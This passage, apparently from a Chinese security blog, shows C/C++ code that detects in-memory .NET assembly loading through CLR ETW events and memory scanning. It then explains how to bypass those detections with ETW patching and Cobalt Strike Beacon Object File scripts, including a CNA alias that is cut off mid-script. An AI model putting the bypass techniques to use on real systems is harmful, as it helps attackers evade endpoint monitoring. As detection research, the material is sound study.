class="meta-string">&lt;windows.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;wbemidl.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;wmistr.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;evntrace.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Evntcons.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">static</span> GUID ClrRuntimeProviderGuid = &#123; <span class="number">0xe13c0d23</span>, <span class="number">0xccbc</span>, <span class="number">0x4e12</span>, &#123; <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0xd9</span>, <span class="number">0xcc</span>, <span class="number">0x2e</span>, <span class="number">0xee</span>, <span class="number">0x27</span>, <span class="number">0xe4</span> &#125; &#125;;</div><div class="line"></div><div class="line"><span class="comment">// Can be stopped with 'logman stop "dotnet trace" -etw'</span></div><div class="line"><span class="keyword">const</span> <span class="keyword">char</span> name[] = <span class="string">"dotnet trace\0"</span>;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack(1)</span></div><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">AssemblyLoadUnloadRundown_V1</span></span></div><div class="line"><span class="class">&#123;</span></div><div class="line">    ULONG64 AssemblyID;</div><div class="line">    ULONG64 AppDomainID;</div><div class="line">    ULONG64 BindingID;</div><div class="line">    ULONG AssemblyFlags;</div><div class="line">    WCHAR FullyQualifiedAssemblyName[<span class="number">1</span>];</div><div class="line">&#125; AssemblyLoadUnloadRundown_V1, *PAssemblyLoadUnloadRundown_V1;</div><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack()</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> NTAPI <span class="title">ProcessEvent</span><span class="params">(PEVENT_RECORD EventRecord)</span> </span>&#123;</div><div class="line"></div><div class="line">    PEVENT_HEADER eventHeader = &amp;EventRecord-&gt;EventHeader;</div><div class="line">    PEVENT_DESCRIPTOR eventDescriptor = &amp;eventHeader-&gt;EventDescriptor;</div><div class="line">    AssemblyLoadUnloadRundown_V1* assemblyUserData;</div><div class="line"></div><div class="line">    <span class="keyword">switch</span> (eventDescriptor-&gt;Id) &#123;</div><div class="line">        <span class="keyword">case</span> AssemblyDCStart_V1:</div><div class="line">            assemblyUserData = (AssemblyLoadUnloadRundown_V1*)EventRecord-&gt;UserData;</div><div class="line">            wprintf(<span class="string">L"[%d] - Assembly: %s\n"</span>, eventHeader-&gt;ProcessId, assemblyUserData-&gt;FullyQualifiedAssemblyName);</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    TRACEHANDLE hTrace = <span class="number">0</span>;</div><div class="line">    ULONG result, bufferSize;</div><div class="line">    EVENT_TRACE_LOGFILEA trace;</div><div class="line">    EVENT_TRACE_PROPERTIES *traceProp;</div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"ETW .NET Trace example - @_xpn_\n\n"</span>);</div><div class="line"></div><div class="line">    <span class="built_in">memset</span>(&amp;trace, <span class="number">0</span>, <span class="keyword">sizeof</span>(EVENT_TRACE_LOGFILEA));</div><div class="line">    trace.ProcessTraceMode    = PROCESS_TRACE_MODE_REAL_TIME | PROCESS_TRACE_MODE_EVENT_RECORD;</div><div class="line">    trace.LoggerName          = (LPSTR)name;</div><div class="line">    trace.EventRecordCallback = (PEVENT_RECORD_CALLBACK)ProcessEvent;</div><div class="line"></div><div class="line">    bufferSize = <span class="keyword">sizeof</span>(EVENT_TRACE_PROPERTIES) + <span class="keyword">sizeof</span>(name) + <span class="keyword">sizeof</span>(WCHAR);</div><div class="line"></div><div class="line">    traceProp = (EVENT_TRACE_PROPERTIES*)LocalAlloc(LPTR, bufferSize);</div><div class="line">    traceProp-&gt;Wnode.BufferSize    = bufferSize;</div><div class="line">    traceProp-&gt;Wnode.ClientContext = <span class="number">2</span>;</div><div class="line">    traceProp-&gt;Wnode.Flags         = WNODE_FLAG_TRACED_GUID;</div><div class="line">    traceProp-&gt;LogFileMode         = EVENT_TRACE_REAL_TIME_MODE | EVENT_TRACE_USE_PAGED_MEMORY;</div><div class="line">    traceProp-&gt;LogFileNameOffset   = <span class="number">0</span>;</div><div class="line">    traceProp-&gt;LoggerNameOffset    = <span class="keyword">sizeof</span>(EVENT_TRACE_PROPERTIES);</div><div class="line"></div><div class="line">    <span class="keyword">if</span> ((result = StartTraceA(&amp;hTrace, (LPCSTR)name, traceProp)) != ERROR_SUCCESS) &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"[!] Error starting trace: %d\n"</span>, result);</div><div class="line">        <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> ((result = EnableTraceEx(</div><div class="line">        &amp;ClrRuntimeProviderGuid,</div><div class="line">        <span class="literal">NULL</span>,</div><div class="line">        hTrace,</div><div class="line">        <span class="number">1</span>,</div><div class="line">        TRACE_LEVEL_VERBOSE,</div><div class="line">        LoaderKeyword</div><div class="line">        <span class="number">0</span>,</div><div class="line">        <span class="number">0</span>,</div><div class="line">        <span class="literal">NULL</span></div><div class="line">    )) != ERROR_SUCCESS) &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"[!] Error EnableTraceEx\n"</span>);</div><div class="line">        <span class="keyword">return</span> <span class="number">2</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    hTrace = OpenTrace(&amp;trace);</div><div class="line">    <span class="keyword">if</span> (hTrace == INVALID_PROCESSTRACE_HANDLE) &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"[!] Error OpenTrace\n"</span>);</div><div class="line">        <span class="keyword">return</span> <span class="number">3</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    result = ProcessTrace(&amp;hTrace, <span class="number">1</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</div><div class="line">    <span class="keyword">if</span> (result != ERROR_SUCCESS) &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"[!] Error ProcessTrace\n"</span>);</div><div class="line">        <span class="keyword">return</span> <span class="number">4</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h3 id="0x2-2-krabsetw安装与使用"><a href="#0x2-2-krabsetw安装与使用" class="headerlink" title="0x2.2 krabsetw安装与使用"></a>0x2.2 krabsetw安装与使用</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://github.com/microsoft/krabsetw" target="_blank" rel="external">krabsetw</a>是微软开发的一个C++库，其主要目的在于简化ETW的交互。krabsetw目前只支持x64的操作系统，而且编译环境最好是VS2017及以上。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;本文也并不使用推荐的NuGet安装krabsetw。而是使用vcpkg进行包管理。具体的关于NuGet的使用可以参考<a href="https://zhuanlan.zhihu.com/p/153199835" target="_blank" rel="external">这篇文章</a>。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 当编译完成<code>vcpkg.exe</code>之后，使用<code>.\vcpkg.exe list</code>查看已经安装的开源库，然后使用<code>.\vcpkg.exe install krabsetw:x64-windows</code>安装krabsetw库。并且一定要将项目的预处理器设置为<code>UNICODE</code>。至于<code>NDEBUG</code>和<code>TYPEASSERT</code>任选其一进行设置。这是krabsetw项目所规定的。具体参见项目说明：<a href="https://github.com/microsoft/krabsetw/blob/master/krabs/README.md" target="_blank" rel="external">https://github.com/microsoft/krabsetw/blob/master/krabs/README.md</a></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用krabsetw捕获CLR加载事件代码如下，具体的使用例子可以参考<a href="https://github.com/microsoft/krabsetw/blob/master/examples/NativeExamples/user_trace_001.cpp" target="_blank" rel="external">krabsetw例子说明</a>。值得注意的是这个设置的关键字我设置的是<code>MonitoringKeyword</code>是可以实时监控的。而不是设置<code>LoaderKeyword</code>。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MonitoringKeyword 0x0000000200000000  </span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">DetectByETW</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">	<span class="comment">//回调函数</span></div><div class="line">	<span class="keyword">auto</span> assembly_callback = [](<span class="keyword">const</span> EVENT_RECORD&amp; record, <span class="keyword">const</span> krabs::trace_context&amp; trace_context)</div><div class="line">	&#123;</div><div class="line">		</div><div class="line">		krabs::schema schema(record, trace_context.schema_locator);</div><div class="line">		krabs::<span class="function">parser <span class="title">parser</span><span class="params">(schema)</span></span>;</div><div class="line">		pids.push_back(record.EventHeader.ProcessId);</div><div class="line">		<span class="comment">//获取ProcessId</span></div><div class="line">		DWORD dwPid = record.EventHeader.ProcessId;</div><div class="line">		WCHAR szExeFile[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</div><div class="line">		DWORD dwSize = MAX_PATH;</div><div class="line">		HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwPid);</div><div class="line">		QueryFullProcessImageNameW(hProcess, <span class="number">0</span>, szExeFile, &amp;dwSize);</div><div class="line">		<span class="comment">//检测内存信息</span></div><div class="line">		BOOL bIsExecuteAssembly = DetectByMemory(hProcess);</div><div class="line">		<span class="keyword">if</span> (bIsExecuteAssembly == TRUE)</div><div class="line">		&#123;</div><div class="line">			SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY | BACKGROUND_BLUE);</div><div class="line">			<span class="built_in">printf</span>(<span class="string">"[%d] : %ls is execute-Assembly(.Net Load Memory)\n"</span>, dwPid, szExeFile);</div><div class="line">			SetConsoleColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">else</span></div><div class="line">		&#123;</div><div class="line">			<span class="built_in">printf</span>(<span class="string">"[%d] : %ls\n"</span>, dwPid, szExeFile);</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">return</span> TRUE;</div><div class="line"></div><div class="line">	&#125;;</div><div class="line">	</div><div class="line">	<span class="comment">//设置跟踪会话</span></div><div class="line">	krabs::<span class="function">user_trace <span class="title">trace</span><span class="params">(<span class="string">L"Assembly Load Monitor"</span>)</span></span>;</div><div class="line">	</div><div class="line">	<span class="comment">//设置Provider</span></div><div class="line">	krabs::provider&lt;&gt; dotnet_rundown_provider(<span class="string">L".NET Common Language Runtime"</span>);  <span class="comment">//L".NET Common Language Runtime"</span></div><div class="line">	</div><div class="line">	<span class="comment">//设置筛选事件关键字，逻辑为any模式</span></div><div class="line">	dotnet_rundown_provider.any(MonitoringKeyword);</div><div class="line">	</div><div class="line">	<span class="comment">//设置回调函数</span></div><div class="line">	dotnet_rundown_provider.add_on_event_callback(assembly_callback);</div><div class="line"></div><div class="line">	<span class="comment">//开始</span></div><div class="line">	trace.enable(dotnet_rundown_provider);</div><div class="line">	trace.start();</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h3 id="0x2-3-加载程序集"><a href="#0x2-3-加载程序集" class="headerlink" title="0x2.3 加载程序集"></a>0x2.3 加载程序集</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第二个检测点位于加载程序集之后。在memcpy处打一个断点。<br><figure class="highlight less"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">SafeArrayAccessData</span>(pSafeArray, &amp;pData);</div><div class="line"><span class="selector-tag">memcpy</span>(pData, dotnetRaw, dwFileSize);</div><div class="line"><span class="selector-tag">SafeArrayUnaccessData</span>(pSafeArray);</div><div class="line"><span class="comment">//检测点2</span></div><div class="line"><span class="selector-tag">pDefaultAppDomain-</span>&gt;<span class="selector-tag">Load_3</span>(pSafeArray, &amp;pAssembly);</div></pre></td></tr></table></figure></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;并在memcpy函数执行之后的目的地址下一个执行断点，并执行。这一步是为了定位需要加载的程序集在Assembly Loader进程中的位置。因为Assembly内存加载，程序集必然在进程的内存空间中。只是需要定位在哪里？且那块内存的内存属性和类型。<br>    <img src="http://hacky.wang/blog/20221106/v2mzD38DdnOO.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20221106/iRXfBirGesVi.png?imageslim" alt="mark"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可以看到程序集保存在内存类型为<code>MEM_COMMIT</code>和<code>MEM_PRIVATE</code>以及保护类型为<code>PAGE_READWRITE</code>的内存块<br>    <img src="http://hacky.wang/blog/20221106/FV5jiQTNxadO.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20221106/dQi0NPKfkE8R.png?imageslim" alt="mark"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;整个扫描逻辑就很简单了，只需要调用VirtualQueryEx获取内存信息，只需要选择内存类型为<code>MEM_COMMIT</code>和<code>MEM_PRIVATE</code>以及保护类型为<code>PAGE_READWRITE</code>的内存块。然后扫描PE头信息即可。<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line">BOOL DetectByMemory(HANDLE hProcess)</div><div class="line">&#123;</div><div class="line">	UCHAR SignMemory[] = &#123; <span class="number">0x54</span>,<span class="number">0x68</span>,<span class="number">0x69</span>,<span class="number">0x73</span>,<span class="number">0x20</span>,<span class="number">0x70</span>,<span class="number">0x72</span>,<span class="number">0x6F</span>,<span class="number">0x67</span>,<span class="number">0x72</span>,<span class="number">0x61</span>,<span class="number">0x6D</span>,<span class="number">0x20</span>,<span class="number">0x63</span>,<span class="number">0x61</span>,<span class="number">0x6E</span>,<span class="number">0x6E</span>,<span class="number">0x6F</span>,<span class="number">0x74</span>,<span class="number">0x20</span>,<span class="number">0x62</span>,<span class="number">0x65</span>,<span class="number">0x20</span>,<span class="number">0x72</span>,<span class="number">0x75</span>,<span class="number">0x6E</span>,<span class="number">0x20</span>,<span class="number">0x69</span>,<span class="number">0x6E</span>,<span class="number">0x20</span>,<span class="number">0x44</span>,<span class="number">0x4F</span>,<span class="number">0x53</span>,<span class="number">0x20</span>,<span class="number">0x6D</span>,<span class="number">0x6F</span>,<span class="number">0x64</span>,<span class="number">0x65</span> &#125;;</div><div class="line">	BOOL bIsExecuteFile = <span class="literal">FALSE</span>;</div><div class="line">	if (NULL == hProcess)</div><div class="line">		return bIsExecuteFile;</div><div class="line">	SYSTEM_INFO sysInfo = &#123; <span class="number">0</span> &#125;;</div><div class="line">	GetSystemInfo(&amp;sysInfo);</div><div class="line">	MEMORY_BASIC_INFORMATION pMemInfo = &#123; <span class="number">0</span> &#125;;</div><div class="line">	DWORD dwErrorCode;</div><div class="line"></div><div class="line">	for (DWORD64 MemoryAddress = (DWORD64)sysInfo.lpMinimumApplicationAddress; MemoryAddress &lt; (DWORD64)<span class="number">0x700000000000</span>; MemoryAddress += pMemInfo.RegionSize) <span class="comment">//0x7ff4e85d0000   0x70000000</span></div><div class="line">	&#123;</div><div class="line">		if (bIsExecuteFile == <span class="literal">TRUE</span>)</div><div class="line">			break;</div><div class="line">		if (VirtualQueryEx(hProcess, (LPVOID)MemoryAddress, &amp;pMemInfo, sizeof(MEMORY_BASIC_INFORMATION)) == <span class="number">0</span>)</div><div class="line">			break;</div><div class="line"></div><div class="line">		if ((pMemInfo.Type == MEM_COMMIT || pMemInfo.Type == MEM_PRIVATE) &amp;&amp; pMemInfo.Protect == PAGE_READWRITE) <span class="comment">//</span></div><div class="line">		&#123;</div><div class="line">			PVOID pMemoryBuffer = malloc(pMemInfo.RegionSize + <span class="number">1</span>);</div><div class="line">			memset(pMemoryBuffer, <span class="number">0</span>, pMemInfo.RegionSize + <span class="number">1</span>);</div><div class="line">			SIZE_T dwReturnNumber = <span class="number">0</span>;</div><div class="line">			if (ReadProcessMemory(hProcess, pMemInfo.BaseAddress, pMemoryBuffer, pMemInfo.RegionSize, &amp;dwReturnNumber) == <span class="literal">FALSE</span>)</div><div class="line">			&#123;</div><div class="line">				printf(<span class="string">"[!] ReadProcessMemory Failed<span class="subst">\n</span>"</span>);</div><div class="line">				free(pMemoryBuffer);</div><div class="line">				pMemoryBuffer = NULL;</div><div class="line">				continue;</div><div class="line">			&#125;</div><div class="line">			for (DWORD64 dwIndex = <span class="number">0</span>; dwIndex &lt; pMemInfo.RegionSize + <span class="number">1</span>; dwIndex++)</div><div class="line">			&#123;</div><div class="line">				if ((memcmp((PVOID)((DWORD64)pMemoryBuffer + dwIndex), SignMemory, sizeof(SignMemory)) == <span class="number">0</span>) &amp;&amp;</div><div class="line">					(memcmp((PVOID)((DWORD64)pMemoryBuffer + dwIndex - <span class="number">0x4E</span>), <span class="string">"MZ"</span>, <span class="number">2</span>) == <span class="number">0</span>))</div><div class="line">				&#123;</div><div class="line">					bIsExecuteFile = <span class="literal">TRUE</span>;</div><div class="line">					break;</div><div class="line">				&#125;</div><div class="line">			&#125;</div><div class="line">			free(pMemoryBuffer);</div><div class="line">			pMemoryBuffer = NULL;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	return bIsExecuteFile;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<h2 id="0x03-绕过上述检测"><a href="#0x03-绕过上述检测" class="headerlink" title="0x03 绕过上述检测"></a>0x03 绕过上述检测</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;绕过上述检测的最简单的思路就是Patch ETW。而我想的是使用BOF进行Bypass ETW 以及Assembly加载。值得庆幸得是CobaltStrike官方以及有大佬已经做了这一部分的研究。</p>
+<h3 id="0x3-1-脚本学习"><a href="#0x3-1-脚本学习" class="headerlink" title="0x3.1  脚本学习"></a>0x3.1  脚本学习</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在官方的文档<a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/beacon-object-files_main.htm" target="_blank" rel="external">Beacon Object Files</a>中，详细描写了怎么使用CNA和BOF。根据文档提供的例子。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">alias hello &#123;</div><div class="line">	local('$barch $handle $data $args');</div><div class="line">	</div><div class="line"><span class="meta">	#</span><span class="bash"> figure out the arch of this session</span></div><div class="line"><span class="meta">	$</span><span class="bash">barch  = barch(<span class="variable">$1</span>);</span></div><div class="line">	</div><div class="line"><span class="meta">	#</span><span class="bash"> <span class="built_in">read</span> <span class="keyword">in</span> the right BOF file</span></div><div class="line"><span class="meta">	$</span><span class="bash">handle = openf(script_resource(<span class="string">"hello. $+ <span class="variable">$barch</span> $+ .o"</span>));</span></div><div class="line"><span class="meta">	$</span><span class="bash">data   = readb(<span class="variable">$handle</span>, -1);</span></div><div class="line"><span class="meta">	closef($</span><span class="bash">handle);</span></div><div class="line">	</div><div class="line"><span class="meta">	#</span><span class="bash"> pack our arguments</span></div><div class="line"><span class="meta">	$</span><span class="bash">args   = bof_pack(<span class="variable">$1</span>, <span class="string">"zi"</span>, <span class="string">"Hello World"</span>, 1234);</span></div><div class="line">	</div><div class="line"><span class="meta">	#</span><span class="bash"> announce what we<span class="string">'re doing</span></span></div><div class="line"><span class="meta">	btask($</span><span class="bash">1, <span class="string">"Running Hello BOF"</span>);</span></div><div class="line">	</div><div class="line"><span class="meta">	#</span><span class="bash"> execute it.</span></div><div class="line"><span class="meta">	beacon_inline_execute($</span><span class="bash">1, <span class="variable">$data</span>, <span class="string">"demo"</span>, <span class="variable">$args</span>);</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用<code>local</code>定义了本地变量。<br><figure class="highlight nsis"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">local(<span class="string">'<span class="variable">$barch</span> <span class="variable">$handle</span> <span class="variable">$data</span> <span class="variable">$args</span>'</span>)<span class="comment">;</span></div></pre></td></tr></table></figure></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用<code>barch</code>函数获取进程架构，以此后续拼接读取BOF时使用。参数$1表示的是当前会话的ID。Alias的参数有3个。</p>
+<ul>
+<li>$0 是我们起的别名和传输的参数</li>
+<li>$1 是当前会话的 ID</li>
+<li>$2-3-4….第二个参数及以后，就是我们 是我们传递的参数，他们由空格隔开，我们举一个例子：<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> figure out the arch of this session</span></div><div class="line"><span class="meta">$</span><span class="bash">barch  = barch(<span class="variable">$1</span>);</span></div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后通过<code>readb</code>读取BOF文件(.obj)<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">read</span> <span class="keyword">in</span> the right BOF file</span></div><div class="line"><span class="meta">$</span><span class="bash">handle = openf(script_resource(<span class="string">"hello. $+ <span class="variable">$barch</span> $+ .o"</span>));</span></div><div class="line"><span class="meta">$</span><span class="bash">data   = readb(<span class="variable">$handle</span>, -1);</span></div><div class="line"><span class="meta">closef($</span><span class="bash">handle);</span></div></pre></td></tr></table></figure></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后再将参数打包。参数1 <code>$1</code>表示会话ID,第二个参数是传入参数的类型，参数类型如下。从第三个参数就是传入的参数。<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">Type</span>	Description	                      Unpack With (C)</div><div class="line"><span class="keyword">b	</span>    <span class="keyword">binary </span><span class="meta">data</span>	                     <span class="keyword">BeaconDataExtract</span></div><div class="line"><span class="keyword">i	</span>    <span class="number">4</span>-<span class="keyword">byte </span>integer	                  <span class="keyword">BeaconDataInt</span></div><div class="line"><span class="keyword">s	</span>    <span class="number">2</span>-<span class="keyword">byte </span>short integer	            <span class="keyword">BeaconDataShort</span></div><div class="line"><span class="keyword">z	</span>    zero-terminated+encoded <span class="keyword">string </span>     <span class="keyword">BeaconDataExtract</span></div><div class="line"><span class="keyword">Z	</span>    zero-terminated wide-char <span class="keyword">string	</span>(wchar_t *)<span class="keyword">BeaconDataExtract</span></div></pre></td></tr></table></figure></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> pack our arguments</span></div><div class="line"><span class="meta">$</span><span class="bash">args   = bof_pack(<span class="variable">$1</span>, <span class="string">"zi"</span>, <span class="string">"Hello World"</span>, 1234);</span></div></pre></td></tr></table></figure>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最后调用<code>beacon_inline_execute</code>,其实就是执行inline_execute命令。第三个参数是入口点函数。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> execute it.</span></div><div class="line"><span class="meta">beacon_inline_execute($</span><span class="bash">1, <span class="variable">$data</span>, <span class="string">"demo"</span>, <span class="variable">$args</span>);</span></div></pre></td></tr></table></figure></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;需要参考Sleep语言的说明<a href="http://sleep.dashnine.org/manual/index.html" target="_blank" rel="external">http://sleep.dashnine.org/manual/index.html</a></p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div></pre></td><td class="code"><pre><div class="line">beacon_command_register(</div><div class="line"><span class="string">"InlineExecute_Assembly"</span>, </div><div class="line"><span class="string">"test1"</span>, </div><div class="line"><span class="string">"test2"</span>);</div><div class="line"></div><div class="line">alias InlineExecute_Assembly&#123;</div><div class="line">	<span class="variable">$data</span> = <span class="built_in">substr</span>(<span class="variable">$0</span>, 5);</div><div class="line">	@<span class="keyword">args</span> = <span class="keyword">split</span>(' ', <span class="variable">$data</span>);</div><div class="line">	println(@<span class="keyword">args</span>); </div><div class="line"></div><div class="line">	<span class="keyword">local</span>('<span class="variable">$AssemblyPath</span> <span class="variable">$AssemblyArgs</span>');</div><div class="line">	<span class="variable">$AssemblyPath</span> = <span class="string">""</span>;</div><div class="line">	<span class="variable">$AssemblyArgs</span> = <span class="string">""</span>;</div><div class="line"></div><div class="line">	@Optional = @(<span class="string">"--AssemblyPath"</span> , <span class="string">"--AssemblyArgs"</span>);</div><div class="line">	<span class="keyword">for</span>(<span class="variable">$i</span> = 0; <span class="variable">$i</span> 